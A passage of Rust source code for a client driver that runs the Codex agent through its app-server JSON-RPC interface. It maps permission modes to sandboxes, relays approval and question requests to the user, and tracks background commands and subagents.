//! Codex over `codex app-server` (JSON-RPC 2.0, one JSON object per line).
//!
//! We send `initialize` (+ `initialized`), then `thread/start` or `thread/resume`, and
//! `turn/start` per message. Codex streams `item/started` / `item/completed` for messages,
//! reasoning, commands, file changes and tool calls, deltas for text and command output,
//! `turn/plan/updated`, `thread/tokenUsage/updated` and `turn/completed`. It asks before acting
//! with server requests (`item/commandExecution/requestApproval`,
//! `item/fileChange/requestApproval`), which we answer with `{decision}`.

use moonfish_transport::Proc;
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use moonfish_core::{
    chats::Goal,
    settings::{AgentKind, PermissionMode},
};
use moonfish_transport::Spec;
use serde_json::{json, Value};

use crate::driver::{Driver, DriverResult, GoalCommand, Prompt, Sink, StartOptions};
use crate::event::*;
use crate::jsonrpc::Rpc;

pub struct CodexDriver {
    rpc: Rpc,
    child: Arc<Mutex<Option<Proc>>>,
    state: Arc<Mutex<State>>,
    sink: Sink,
    permission: PermissionMode,
    /// After a mode change, send its sandbox on every new turn (including retries).
    /// Until then, preserve the sandbox resolved by thread/start or thread/resume.
    permission_changed: bool,
    goal_options_changed: bool,
    model: Option<String>,
    effort: Option<String>,
    fast_mode: Option<bool>,
}

enum PendingApproval {
    Decision,
    Elicitation,
    Permissions(Value),
}

struct PendingApprovalEntry {
    rpc_id: Value,
    kind: PendingApproval,
}

struct PendingElicitation {
    rpc_id: Value,
    fields: Vec<crate::acp::Field>,
}

#[derive(Default)]
struct State {
    thread_id: Option<String>,
    turn_id: Option<String>,
    /// A prompt awaiting acknowledgement from turn/start or turn/steer.
    pending_user: Option<ChatEvent>,
    pending_approvals: HashMap<String, PendingApprovalEntry>,
    /// Questions waiting: our request id → the JSON-RPC id.
    questions: HashMap<String, Value>,
    pending_elicitations: HashMap<String, PendingElicitation>,
    /// File changes by item id, for the approval card's diff.
    changes: HashMap<String, Vec<FileDiff>>,
    tools_by_item_id: HashMap<String, ToolCall>,
    usage: Option<Usage>,
    alive: bool,
    /// Background work: terminals (commands Codex keeps running after its turn: they end with
    /// their `item/completed`, whenever that comes) and subagents (spawned threads).
    tasks: TaskList,
    /// Commands running in this turn, in case they outlive it: item id → task.
    open: HashMap<String, BackgroundTask>,
    /// Subagents' thread ids: their notifications feed their task, not this chat.
    agents: std::collections::HashSet<String>,
}

impl State {
    fn publish_user(&mut self, sink: &Sink) {
        if let Some(event) = self.pending_user.take() {
            sink(event);
        }
    }
}

fn speed_tier(fast: bool) -> &'static str {
    if fast {
        "priority"
    } else {
        "default"
    }
}

/// Codex's approval policy and sandbox for each permission mode.
pub fn policy(mode: PermissionMode) -> (&'static str, &'static str) {
    match mode {
        PermissionMode::Ask => ("untrusted", "workspace-write"),
        PermissionMode::AcceptEdits => ("on-request", "workspace-write"),
        PermissionMode::Plan => ("on-request", "read-only"),
        PermissionMode::FullAccess => ("never", "danger-full-access"),
    }
}

/// What Codex says when a thread is open in another of its app servers: one writes a thread
/// at a time.
const OTHER_WRITER: &str = "already has an active writer";

impl CodexDriver {
    pub fn start(opts: StartOptions, sink: Sink) -> DriverResult<CodexDriver> {
        // A try that fails says nothing to the chat (its process ending isn't the chat's agent
        // exiting).
        let attempt = |opts: StartOptions| {
            let heard = Arc::new(std::sync::atomic::AtomicBool::new(true));
            let own: Sink = {
                let (heard, sink) = (heard.clone(), sink.clone());
                Arc::new(move |e| {
                    if heard.load(std::sync::atomic::Ordering::SeqCst) {
                        sink(e)
                    }
                })
            };
            Self::start_once(opts, own).inspect_err(|_| heard.store(false, std::sync::atomic::Ordering::SeqCst))
        };
        // The thread was just open in Codex's own CLI: its app server may take a moment to let
        // go of it as it ends.
        let until = std::time::Instant::now() + Duration::from_secs(6);
        loop {
            match attempt(opts.clone()) {
                Err(e) if opts.resume.is_some() && e.contains(OTHER_WRITER) => {
                    if std::time::Instant::now() >= until {
                        return Err(concat!(
                            "This chat's thread is open in another Codex CLI or background server. ",
                            "Close it there or run `codex app-server daemon stop`, then send again."
                        )
                        .into());
                    }
                    thread::sleep(Duration::from_millis(500));
                }
                r => return r,
            }
        }
    }

    fn start_once(opts: StartOptions, sink: Sink) -> DriverResult<CodexDriver> {
        let args = vec!["app-server".to_string()];
        let program = if opts.binary.trim().is_empty() { AgentKind::Codex.default_binary().to_string() } else { opts.binary.clone() };
        let spec = Spec { location: &opts.location, cwd: &opts.cwd, program: &program, args, env: &opts.env };
        let mut child = moonfish_transport::spawn(&spec).map_err(|e| format!("couldn't start Codex: {e}"))?;
        let stdout = child.stdout.take().ok_or("no stdout")?;
        let stderr = child.stderr.take().ok_or("no stderr")?;
        let rpc = Rpc::new(child.stdin.take(), "Codex");
        let child = Arc::new(Mutex::new(Some(child)));
        let state = Arc::new(Mutex::new(State { alive: true, ..Default::default() }));

        let tail = Arc::new(Mutex::new(String::new()));
        {
            let tail = tail.clone();
            thread::spawn(move || {
                let mut buf = String::new();
                let _ = BufReader::new(stderr).read_to_string(&mut buf);
                let keep: Vec<&str> = buf.lines().filter(|l| !l.trim().is_empty()).collect();
                *tail.lock().unwrap() = keep[keep.len().saturating_sub(6)..].join("\n");
            });
        }
        {
            let (sink, state, rpc, child) = (sink.clone(), state.clone(), rpc.clone(), child.clone());
            thread::spawn(move || {
                let mut tr = Translator { sink: sink.clone(), state: state.clone(), rpc: rpc.clone() };
                for line in BufReader::new(stdout).lines().map_while(Result::ok) {
                    if let Ok(v) = serde_json::from_str::<Value>(&line) {
                        tr.handle(&v);
                    }
                }
                state.lock().unwrap().alive = false;
                rpc.fail_all();
                let code = child.lock().unwrap().as_mut().and_then(|c| c.wait().ok()).and_then(|s| s.code());
                thread::sleep(Duration::from_millis(50));
                let (turn, tasks) = {
                    let mut st = state.lock().unwrap();
                    st.open.clear();
                    let tasks = st.tasks.stop_all().then(|| st.tasks.event());
                    (st.turn_id.take(), tasks)
                };
                if let Some(turn_id) = turn {
                    sink(ChatEvent::TurnFinished { turn_id, usage: None, cost_usd: None, duration_ms: None, interrupted: true });
                }
                // Its terminals and subagents went with it.
                if let Some(e) = tasks {
                    sink(e);
                }
                // 127: the shell couldn't find the program (on an SSH host, usually not installed).
                let message = if code == Some(127) {
                    Some("Codex isn't installed there, or isn't on that machine's PATH.".to_string())
                } else {
                    Some(tail.lock().unwrap().clone()).filter(|m| !m.is_empty())
                };
                sink(ChatEvent::Exited { code, message });
            });
        }

        let d = CodexDriver {
            rpc,
            child,
            state,
            sink,
            permission: opts.permission,
            permission_changed: false,
            goal_options_changed: false,
            model: opts.model.clone(),
            effort: opts.effort.clone(),
            fast_mode: opts.fast_mode,
        };
        d.rpc.call(
            "initialize",
            json!({"clientInfo": {"name": "moonfish", "title": "Moonfish", "version": env!("CARGO_PKG_VERSION")}, "capabilities": null}),
            Duration::from_secs(30),
        )?;
        d.rpc.notify("initialized", None)?;
        let (approval, sandbox) = policy(opts.permission);
        let mut params = json!({"cwd": opts.cwd, "approvalPolicy": approval, "sandbox": sandbox});
        if let Some(m) = &opts.model {
            params["model"] = json!(m);
        }
        if let Some(fast) = opts.fast_mode {
            params["serviceTier"] = json!(speed_tier(fast));
        }
        if let Some(effort) = &opts.effort {
            params["config"] = json!({"model_reasoning_effort": effort});
        }
        let result = match &opts.resume {
            Some(id) => {
                params["threadId"] = json!(id);
                params["excludeTurns"] = json!(true);
                d.rpc.call("thread/resume", params, Duration::from_secs(60))
            }
            None => d.rpc.call("thread/start", params, Duration::from_secs(60)),
        }?;
        let thread = &result["thread"];
        let thread_id = thread["id"].as_str().ok_or("Codex didn't start a thread")?.to_string();
        d.state.lock().unwrap().thread_id = Some(thread_id.clone());
        let cwd = thread["environments"][0]["cwd"].as_str().map(String::from).or(Some(opts.cwd.clone()));
        let current = result["model"].as_str().map(String::from).or(opts.model.clone());
        (d.sink)(ChatEvent::Started { session_id: Some(thread_id.clone()), model: current.clone(), cwd });
        if opts.resume.is_some() {
            if let Ok(result) = d.rpc.call("thread/goal/get", json!({"threadId": thread_id}), Duration::from_secs(5)) {
                (d.sink)(ChatEvent::GoalChanged { goal: parse_goal(&result["goal"]) });
            }
        }
        // The model picker and the skills for the / menu: Codex's own lists.
        let (rpc, sink, folder) = (d.rpc.clone(), d.sink.clone(), opts.cwd.clone());
        thread::spawn(move || {
            if let Ok(list) = rpc.call("model/list", json!({"limit": 100, "includeHidden": false}), Duration::from_secs(30)) {
                sink(ChatEvent::Models { models: parse_models(&list), current });
            }
            if let Ok(list) = rpc.call("skills/list", json!({"cwds": [folder]}), Duration::from_secs(30)) {
                sink(ChatEvent::Commands { commands: parse_skills(&list) });
            }
        });
        Ok(d)
    }

    fn thread_id(&self) -> DriverResult<String> {
        let s = self.state.lock().unwrap();
        if !s.alive {
            return Err("Codex isn't running".into());
        }
        s.thread_id.clone().ok_or_else(|| "Codex has no thread".into())
    }
}

impl Driver for CodexDriver {
    fn send(&mut self, prompt: Prompt) -> DriverResult<()> {
        let thread_id = self.thread_id()?;
        let mut input = vec![json!({"type": "text", "text": prompt.text, "text_elements": []})];
        for img in &prompt.images {
            input.push(json!({"type": "image", "url": format!("data:{};base64,{}", img.mime, img.data)}));
        }
        let user = ChatEvent::UserMessage {
            id: prompt.id,
            text: prompt.text,
            images: prompt.images.iter().map(|i| i.mime.clone()).collect(),
            files: prompt.files.clone(),
        };
        let tasks = {
            let mut st = self.state.lock().unwrap();
            st.tasks.clear_ended().then(|| st.tasks.event())
        };
        if let Some(e) = tasks {
            (self.sink)(e);
        }
        let (approval, _) = policy(self.permission);
        let mut params = json!({"threadId": thread_id, "input": input, "approvalPolicy": approval});
        if self.permission_changed {
            // turn/start takes a tagged policy, unlike thread/start's kebab-case mode.
            // Changing approvals alone leaves the previous sandbox in force.
            params["sandboxPolicy"] = match self.permission {
                PermissionMode::Ask | PermissionMode::AcceptEdits => json!({"type": "workspaceWrite", "networkAccess": false}),
                PermissionMode::Plan => json!({"type": "readOnly"}),
                PermissionMode::FullAccess => json!({"type": "dangerFullAccess"}),
            };
        }
        if let Some(m) = &self.model {
            params["model"] = json!(m);
        }
        if let Some(fast) = self.fast_mode {
            params["serviceTier"] = json!(speed_tier(fast));
        }
        if let Some(e) = &self.effort {
            params["effort"] = json!(e);
        }
        // If the active turn finishes before steering reaches it, start a new turn.
        let running = {
            let mut st = self.state.lock().unwrap();
            st.pending_user = Some(user);
            st.turn_id.clone()
        };
        if let Some(turn_id) = running {
            let steer = json!({"threadId": params["threadId"], "expectedTurnId": turn_id, "input": params["input"]});
            let result = self.rpc.call("turn/steer", steer, Duration::from_secs(60));
            if result.is_ok() {
                self.state.lock().unwrap().publish_user(&self.sink);
                return Ok(());
            }
            let mut st = self.state.lock().unwrap();
            if st.pending_user.is_none() {
                return Ok(()); // The input arrived in the event stream before the reply.
            }
            if st.turn_id.as_deref() == Some(&turn_id) {
                st.pending_user = None;
                return result.map(|_| ());
            }
        }
        // The host removes a queued reply after the app server accepts it.
        match self.rpc.call("turn/start", params, Duration::from_secs(120)) {
            Ok(_) => {
                self.state.lock().unwrap().publish_user(&self.sink);
                Ok(())
            }
            Err(error) => {
                if self.state.lock().unwrap().pending_user.take().is_none() {
                    Ok(())
                } else {
                    Err(error)
                }
            }
        }
    }

    fn interrupt(&mut self) -> DriverResult<()> {
        let thread_id = self.thread_id()?;
        let Some(turn_id) = self.state.lock().unwrap().turn_id.clone() else { return Ok(()) };
        let rpc = self.rpc.clone();
        thread::spawn(move || {
            let _ = rpc.call("turn/interrupt", json!({"threadId": thread_id, "turnId": turn_id}), Duration::from_secs(30));
        });
        Ok(())
    }

    fn answer(&mut self, request_id: &str, decision: Decision) -> DriverResult<()> {
        let PendingApprovalEntry { rpc_id, kind } =
            self.state.lock().unwrap().pending_approvals.remove(request_id).ok_or("that question was already answered")?;
        let reply = approval_reply(&kind, decision);
        (self.sink)(ChatEvent::ApprovalResolved { request_id: request_id.into(), decision });
        self.rpc.reply(&rpc_id, reply)
    }

    fn answer_question(&mut self, request_id: &str, answers: std::collections::BTreeMap<String, Vec<String>>) -> DriverResult<()> {
        let elicitation = self.state.lock().unwrap().pending_elicitations.remove(request_id);
        if let Some(PendingElicitation { rpc_id, fields }) = elicitation {
            let reply = crate::acp::elicitation_reply(&fields, &answers);
            (self.sink)(ChatEvent::QuestionResolved { request_id: request_id.into(), answers });
            return self.rpc.reply(&rpc_id, reply);
        }
        let rpc_id = self.state.lock().unwrap().questions.remove(request_id).ok_or("that question was already answered")?;
        let body: serde_json::Map<String, Value> = answers.iter().map(|(k, v)| (k.clone(), json!({"answers": v}))).collect();
        (self.sink)(ChatEvent::QuestionResolved { request_id: request_id.into(), answers });
        self.rpc.reply(&rpc_id, json!({"answers": body}))
    }

    fn set_model(&mut self, model: &str) -> DriverResult<()> {
        // Applied with the next turn/start.
        self.goal_options_changed |= self.model.as_deref() != Some(model);
        self.model = Some(model.to_string()).filter(|m| !m.is_empty());
        Ok(())
    }

    fn set_permission(&mut self, mode: PermissionMode) -> DriverResult<()> {
        // Applied with the next turn/start.
        self.permission_changed |= self.permission != mode;
        self.permission = mode;
        Ok(())
    }

    fn set_fast_mode(&mut self, fast_mode: Option<bool>) -> DriverResult<bool> {
        self.goal_options_changed |= self.fast_mode != fast_mode;
        self.fast_mode = fast_mode;
        Ok(true)
    }

    fn set_effort(&mut self, effort: &str) -> DriverResult<bool> {
        // Applied with the next turn/start.
        self.goal_options_changed |= self.effort.as_deref() != Some(effort);
        self.effort = Some(effort.to_string()).filter(|e| !e.is_empty());
        Ok(true)
    }

    fn resumable(&self) -> bool {
        true
    }

    fn background(&self) -> usize {
        self.state.lock().unwrap().tasks.running()
    }

    fn idle(&self) -> bool {
        let s = self.state.lock().unwrap();
        s.turn_id.is_none() && s.pending_approvals.is_empty() && s.questions.is_empty() && s.pending_elicitations.is_empty()
    }

    fn goal_needs_restart(&self) -> bool {
        self.permission_changed || self.goal_options_changed
    }

    fn goal(&mut self, command: GoalCommand<'_>) -> DriverResult<()> {
        let thread_id = self.thread_id()?;
        let (method, params) = goal_request(&thread_id, command);
        self.rpc.call(method, params, Duration::from_secs(30)).map(|_| ())
    }

    fn compact(&mut self, instructions: &str) -> DriverResult<bool> {
        if !instructions.trim().is_empty() {
            return Err("Codex's /compact doesn't take instructions".into());
        }
        let thread_id = self.thread_id()?;
        let (rpc, sink) = (self.rpc.clone(), self.sink.clone());
        thread::spawn(move || {
            if let Err(e) = rpc.call("thread/compact/start", json!({"threadId": thread_id}), Duration::from_secs(60)) {
                sink(ChatEvent::Error { message: format!("Couldn't compact: {e}") });
            }
        });
        Ok(true)
    }

    fn stop(&mut self) {
        self.rpc.stdin.lock().unwrap().take();
        // Stdin closed: it may exit by itself (saving its session); then it and everything it
        // started (commands, servers) end.
        if let Some(mut c) = self.child.lock().unwrap().take() {
            moonfish_transport::stop_tree(&mut c, std::time::Duration::from_millis(500));
        }
    }
}

impl Drop for CodexDriver {
    fn drop(&mut self) {
        self.stop();
    }
}

// ---- Translation -----------------------------------------------------------------------------

struct Translator {
    sink: Sink,
    state: Arc<Mutex<State>>,
    rpc: Rpc,
}

const MAX_OUTPUT: usize = 16 * 1024;

impl Translator {
    fn emit(&self, e: ChatEvent) {
        (self.sink)(e)
    }

    fn handle(&mut self, v: &Value) {
        // A reply to one of our requests.
        if self.rpc.take_reply(v) || v.get("method").is_none() {
            return;
        }
        let method = v["method"].as_str().unwrap_or("");
        let p = &v["params"];
        if let Some(id) = v.get("id") {
            match method {
                "item/commandExecution/requestApproval"
                | "item/fileChange/requestApproval"
                | "execCommandApproval"
                | "applyPatchApproval"
                | "item/mcpToolCall/requestApproval"
                | "mcpToolCall/requestApproval"
                | "item/permissions/requestApproval"
                | "permissions/requestApproval" => self.approval(id, method, p),
                "item/tool/requestUserInput" => self.question(id, p),
                "mcpServer/elicitation/request" => self.elicitation(id, p),
                _ => {
                    let _ = self.rpc.write(
                        &json!({"jsonrpc": "2.0", "id": id, "error": {"code": -32601, "message": "Moonfish doesn't support this request"}}),
                    );
                }
            }
            return;
        }
        if let Some(thread) = p["threadId"].as_str().filter(|t| self.state.lock().unwrap().agents.contains(*t)) {
            return self.subagent(thread, method, p);
        }
        match method {
            "thread/goal/updated" => {
                if let Some(goal) = parse_goal(&p["goal"]) {
                    self.emit(ChatEvent::GoalChanged { goal: Some(goal) });
                }
            }
            "thread/goal/cleared" => self.emit(ChatEvent::GoalChanged { goal: None }),
            "turn/started" => {
                let id = p["turn"]["id"].as_str().unwrap_or("").to_string();
                {
                    let mut st = self.state.lock().unwrap();
                    st.publish_user(&self.sink);
                    st.turn_id = Some(id.clone());
                }
                self.emit(ChatEvent::TurnStarted { turn_id: id });
            }
            "item/started" => self.item(&p["item"], false),
            "item/completed" => self.item(&p["item"], true),
            "item/agentMessage/delta" => self.emit(ChatEvent::TextDelta { item_id: s(&p["itemId"]), text: s(&p["delta"]) }),
            "item/reasoning/summaryTextDelta" | "item/reasoning/textDelta" => {
                self.emit(ChatEvent::ReasoningDelta { item_id: s(&p["itemId"]), text: s(&p["delta"]) })
            }
            "turn/plan/updated" => self.emit(ChatEvent::Plan {
                items: p["plan"]
                    .as_array()
                    .into_iter()
                    .flatten()
                    .map(|st| PlanItem {
                        text: s(&st["step"]),
                        status: match st["status"].as_str() {
                            Some("completed") => PlanStatus::Completed,
                            Some("inProgress") | Some("in_progress") => PlanStatus::InProgress,
                            _ => PlanStatus::Pending,
                        },
                    })
                    .collect(),
            }),
            "thread/tokenUsage/updated" => {
                let u = &p["tokenUsage"];
                let last = &u["last"];
                let input = last["inputTokens"].as_u64().unwrap_or(0);
                let cached = last["cachedInputTokens"].as_u64().unwrap_or(0);
                let usage = Usage {
                    input_tokens: input.saturating_sub(cached),
                    output_tokens: last["outputTokens"].as_u64().unwrap_or(0),
                    cache_read_tokens: cached,
                    cache_write_tokens: last["cacheWriteInputTokens"].as_u64().unwrap_or(0),
                };
                {
                    let mut st = self.state.lock().unwrap();
                    let acc = st.usage.get_or_insert_with(Usage::default);
                    acc.input_tokens += usage.input_tokens;
                    acc.output_tokens += usage.output_tokens;
                    acc.cache_read_tokens += usage.cache_read_tokens;
                    acc.cache_write_tokens += usage.cache_write_tokens;
                }
                if let Some(window) = u["modelContextWindow"].as_u64() {
                    self.emit(ChatEvent::Context {
                        used_tokens: last["totalTokens"].as_u64().unwrap_or(input),
                        window_tokens: window,
                        parts: vec![],
                    });
                }
            }
            "turn/completed" => {
                let turn = &p["turn"];
                let (turn_id, usage, tasks) = {
                    let mut st = self.state.lock().unwrap();
                    st.pending_approvals.clear();
                    st.questions.clear();
                    st.pending_elicitations.clear();
                    st.tools_by_item_id.clear();
                    st.turn_id = None;
                    // Commands and subagents still running are background work now (unless the
                    // turn was stopped: then they were cut off with it).
                    let left: Vec<BackgroundTask> = st.open.drain().map(|(_, t)| t).filter(|_| turn["status"] != "interrupted").collect();
                    let mut changed = false;
                    for t in left {
                        changed |= st.tasks.add(t);
                    }
                    if turn["status"] != "interrupted" {
                        changed |= st.tasks.promote_running_agents();
                    } else {
                        changed |= st.tasks.stop_in_turn();
                    }
                    (s(&turn["id"]), st.usage.take(), changed.then(|| st.tasks.event()))
                };
                if let Some(e) = tasks {
                    self.emit(e);
                }
                let status = turn["status"].as_str().unwrap_or("completed");
                if status == "failed" {
                    let msg = turn["error"]["message"].as_str().unwrap_or("The turn failed.").to_string();
                    self.emit(ChatEvent::Error { message: msg });
                }
                self.emit(ChatEvent::TurnFinished {
                    turn_id,
                    usage,
                    cost_usd: None,
                    duration_ms: turn["durationMs"].as_u64(),
                    interrupted: status == "interrupted",
                });
            }
            "error" => {
                if p["willRetry"].as_bool() != Some(true) {
                    let msg = p["error"]["message"].as_str().or(p["message"].as_str()).unwrap_or("Codex reported an error").to_string();
                    self.emit(ChatEvent::Error { message: msg });
                }
            }
            "account/rateLimits/updated" if p["rateLimits"]["rateLimitReachedType"].is_string() => {
                self.emit(ChatEvent::Notice { level: NoticeLevel::Warn, text: "You've hit a Codex usage limit.".into() });
            }
            _ => {}
        }
    }

    fn item(&mut self, item: &Value, done: bool) {
        let id = s(&item["id"]);
        match item["type"].as_str().unwrap_or("") {
            "userMessage" if !done => {
                let mut st = self.state.lock().unwrap();
                if let Some(ChatEvent::UserMessage { text, .. }) = &st.pending_user {
                    if item["content"].as_array().is_some_and(|parts| parts.iter().any(|part| part["text"].as_str() == Some(text))) {
                        st.publish_user(&self.sink);
                    }
                }
            }
            "agentMessage" if done => self.emit(ChatEvent::Text { item_id: id, text: s(&item["text"]) }),
            "contextCompaction" if done => {
                self.emit(ChatEvent::Notice { level: NoticeLevel::Info, text: "Compacted the conversation so far.".into() })
            }
            "reasoning" if done => {
                let parts: Vec<String> = item["summary"]
                    .as_array()
                    .or(item["content"].as_array())
                    .into_iter()
                    .flatten()
                    .filter_map(|x| x.as_str().map(String::from))
                    .collect();
                if !parts.is_empty() {
                    self.emit(ChatEvent::Reasoning { item_id: id, text: parts.join("\n\n") });
                }
            }
            "commandExecution" => {
                let command = s(&item["command"]);
                if !done {
                    // A command in a terminal Codex can leave running (it has a process id).
                    let terminal = item["processId"].is_string()
                        || item["source"].as_str().is_some_and(|s| s.to_ascii_lowercase().contains("unified"));
                    if terminal && item["source"].as_str().is_none_or(|s| !s.to_ascii_lowercase().contains("interaction")) {
                        let mut t = BackgroundTask::running(id.clone(), TaskKind::Command, strip_shell(&command));
                        t.item_id = Some(id.clone());
                        self.state.lock().unwrap().open.insert(id.clone(), t);
                    }
                    let kind = command_kind(item);
                    self.emit(ChatEvent::ToolStarted {
                        item_id: id,
                        tool: ToolCall {
                            kind,
                            name: "shell".into(),
                            title: strip_shell(&command),
                            input: json!({"command": command}),
                            path: None,
                        },
                    });
                } else {
                    let ok = item["status"] == "completed" && item["exitCode"].as_i64().unwrap_or(0) == 0;
                    let ended = {
                        let mut st = self.state.lock().unwrap();
                        st.open.remove(&id);
                        let how = match item["exitCode"].as_i64() {
                            Some(code) => format!("exit code {code}"),
                            None => s(&item["status"]),
                        };
                        let status = if ok { TaskStatus::Completed } else { TaskStatus::Failed };
                        st.tasks
                            .finish(&id, status, Some(how.clone()))
                            .map(|t| format!("Background command ended ({how}): {}", t.title))
                            .map(|n| (n, st.tasks.event()))
                    };
                    self.emit(ChatEvent::ToolFinished { item_id: id, ok, output: clip(s(&item["aggregatedOutput"])), diff: None });
                    if let Some((notice, tasks)) = ended {
                        self.emit(tasks);
                        self.emit(ChatEvent::Notice { level: NoticeLevel::Info, text: notice });
                    }
                }
            }
            "fileChange" => {
                let diffs: Vec<FileDiff> =
                    item["changes"].as_array().into_iter().flatten().map(|c| FileDiff::from_patch(s(&c["path"]), s(&c["diff"]))).collect();
                if !done {
                    let title = diffs.iter().map(|d| d.path.clone()).collect::<Vec<_>>().join(", ");
                    let path = diffs.first().map(|d| d.path.clone());
                    let kind = if item["changes"][0]["kind"]["type"] == "add" { ToolKind::Write } else { ToolKind::Edit };
                    self.state.lock().unwrap().changes.insert(id.clone(), diffs);
                    self.emit(ChatEvent::ToolStarted {
                        item_id: id,
                        tool: ToolCall { kind, name: "apply_patch".into(), title, input: item["changes"].clone(), path },
                    });
                } else {
                    let ok = item["status"] == "completed";
                    self.emit(ChatEvent::ToolFinished { item_id: id, ok, output: String::new(), diff: merge(diffs) });
                }
            }
            "dynamicToolCall" | "collabAgentToolCall" | "mcpToolCall" => {
                let is_collab = item["type"] == "collabAgentToolCall";
                if is_collab {
                    self.collab(item, done);
                }
                let name = item["tool"].as_str().or(item["name"].as_str()).unwrap_or("tool").to_string();
                if !done {
                    let is_spawn = is_collab && matches!(name.as_str(), "spawnAgent" | "spawn_agent");
                    let kind = if is_spawn { ToolKind::Task } else { ToolKind::Other };
                    let title = if is_spawn {
                        collab_title(item)
                    } else {
                        format!("{}{}", item["server"].as_str().map(|s| format!("{s} · ")).unwrap_or_default(), name)
                    };
                    let input = if is_collab && item["arguments"].is_null() { item.clone() } else { item["arguments"].clone() };
                    let tool = ToolCall { kind, name, title, input, path: None };
                    self.state.lock().unwrap().tools_by_item_id.insert(id.clone(), tool.clone());
                    self.emit(ChatEvent::ToolStarted { item_id: id, tool });
                } else {
                    let ok = item["status"] != "failed" && item["error"].is_null();
                    // An MCP result's text, rather than its JSON envelope.
                    let text = item["result"]["content"]
                        .as_array()
                        .map(|parts| parts.iter().filter_map(|p| p["text"].as_str()).collect::<Vec<_>>().join("\n"));
                    let output = match (ok, text) {
                        (true, Some(t)) if !t.is_empty() => clip(t),
                        (true, _) => clip(item["result"].to_string()),
                        (false, _) => s(&item["error"]["message"]),
                    };
                    self.emit(ChatEvent::ToolFinished { item_id: id, ok, output, diff: None });
                }
            }
            "webSearch" => {
                if !done {
                    self.emit(ChatEvent::ToolStarted {
                        item_id: id,
                        tool: ToolCall {
                            kind: ToolKind::Web,
                            name: "web_search".into(),
                            title: s(&item["query"]),
                            input: item.clone(),
                            path: None,
                        },
                    });
                } else {
                    self.emit(ChatEvent::ToolFinished { item_id: id, ok: true, output: String::new(), diff: None });
                }
            }
            _ => {}
        }
    }

    /// A subagent tool call (`spawnAgent`, `wait`, `sendInput`, `closeAgent`…): starts
    /// subagents inside the current turn and tracks their live status.
    fn collab(&mut self, item: &Value, done: bool) {
        let mut ended = Vec::new();
        let event = {
            let mut st = self.state.lock().unwrap();
            let mut changed = false;
            let tool = item["tool"].as_str().unwrap_or("");
            let receivers: Vec<&str> = item["receiverThreadIds"].as_array().into_iter().flatten().filter_map(|t| t.as_str()).collect();
            if matches!(tool, "spawnAgent" | "spawn_agent") {
                let title = collab_title(item);
                let bg = st.turn_id.is_none();
                for &thread in &receivers {
                    st.agents.insert(thread.to_string());
                    let mut t = if bg {
                        BackgroundTask::running(thread, TaskKind::Agent, title.clone())
                    } else {
                        BackgroundTask::in_turn(thread, TaskKind::Agent, title.clone())
                    };
                    t.item_id = item["id"].as_str().map(String::from);
                    changed |= st.tasks.add(t);
                }
            } else if matches!(tool, "sendInput" | "send_input") {
                let msg = item["prompt"].as_str().or_else(|| item["message"].as_str()).map(first_line).filter(|m| !m.is_empty());
                if let Some(msg) = msg {
                    for &thread in &receivers {
                        changed |= st.tasks.progress(thread, None, Some(&msg));
                    }
                }
            }
            for (thread, state) in item["agentsStates"].as_object().into_iter().flatten() {
                let msg = state["message"].as_str().map(first_line).filter(|m| !m.is_empty());
                let status = match state["status"].as_str().unwrap_or("") {
                    "completed" => Some(TaskStatus::Completed),
                    "errored" | "failed" => Some(TaskStatus::Failed),
                    "interrupted" | "shutdown" | "notFound" | "closed" => Some(TaskStatus::Stopped),
                    _ => None,
                };
                match status {
                    Some(status) => {
                        if let Some(t) = st.tasks.finish(thread, status, msg) {
                            if t.background {
                                ended.push(format!("Subagent finished: {}", t.title));
                            }
                            changed = true;
                        }
                    }
                    None => {
                        if let Some(msg) = msg {
                            changed |= st.tasks.progress(thread, None, Some(&msg));
                        }
                    }
                }
            }
            if done && matches!(tool, "closeAgent" | "close_agent") && item["status"] != "failed" {
                for &thread in &receivers {
                    if let Some(t) = st.tasks.finish(thread, TaskStatus::Stopped, None) {
                        if t.background {
                            ended.push(format!("Subagent finished: {}", t.title));
                        }
                        changed = true;
                    }
                }
            }
            changed.then(|| st.tasks.event())
        };
        if let Some(e) = event {
            self.emit(e);
        }
        for text in ended {
            self.emit(ChatEvent::Notice { level: NoticeLevel::Info, text });
        }
    }

    /// A notification from a subagent's thread: progress for its task.
    fn subagent(&mut self, thread: &str, method: &str, p: &Value) {
        let mut ended = None;
        let event = {
            let mut st = self.state.lock().unwrap();
            let changed = match method {
                "item/completed" if p["item"]["type"] == "agentMessage" => {
                    st.tasks.progress(thread, None, p["item"]["text"].as_str().map(first_line).as_deref())
                }
                "item/started" if p["item"]["type"] == "commandExecution" => {
                    st.tasks.progress(thread, None, Some(&format!("Running {}", strip_shell(&s(&p["item"]["command"])))))
                }
                "turn/completed" => {
                    let status = match p["turn"]["status"].as_str() {
                        Some("failed") => TaskStatus::Failed,
                        Some("interrupted") => TaskStatus::Stopped,
                        _ => TaskStatus::Completed,
                    };
                    match st.tasks.finish(thread, status, None) {
                        Some(t) => {
                            if t.background {
                                ended = Some(format!("Subagent finished: {}", t.title));
                            }
                            true
                        }
                        None => false,
                    }
                }
                _ => false,
            };
            changed.then(|| st.tasks.event())
        };
        if let Some(e) = event {
            self.emit(e);
        }
        if let Some(text) = ended {
            self.emit(ChatEvent::Notice { level: NoticeLevel::Info, text });
        }
    }

    fn question(&mut self, rpc_id: &Value, p: &Value) {
        let request_id = format!("cxq-{rpc_id}");
        let questions = p["questions"]
            .as_array()
            .into_iter()
            .flatten()
            .map(|q| Question {
                id: s(&q["id"]),
                header: s(&q["header"]),
                question: s(&q["question"]),
                options: q["options"]
                    .as_array()
                    .into_iter()
                    .flatten()
                    .map(|o| QuestionOption { label: s(&o["label"]), description: s(&o["description"]) })
                    .collect(),
                multi: false,
                other: q["isOther"].as_bool().unwrap_or(false),
                secret: q["isSecret"].as_bool().unwrap_or(false),
            })
            .collect();
        self.state.lock().unwrap().questions.insert(request_id.clone(), rpc_id.clone());
        self.emit(ChatEvent::Question { request: QuestionRequest { request_id, questions } });
    }

    fn elicitation(&mut self, rpc_id: &Value, p: &Value) {
        let server = p["serverName"].as_str().or(p["server"].as_str()).map(str::trim).filter(|s| !s.is_empty());
        if p["mode"] == "url" {
            if let Some(url) = p["url"].as_str().filter(|u| !u.is_empty()) {
                let msg = p["message"].as_str().filter(|m| !m.trim().is_empty()).unwrap_or("The MCP server asks you to open:");
                let text = match server {
                    Some(srv) => format!("{srv}: {msg} {url}"),
                    None => format!("{msg} {url}"),
                };
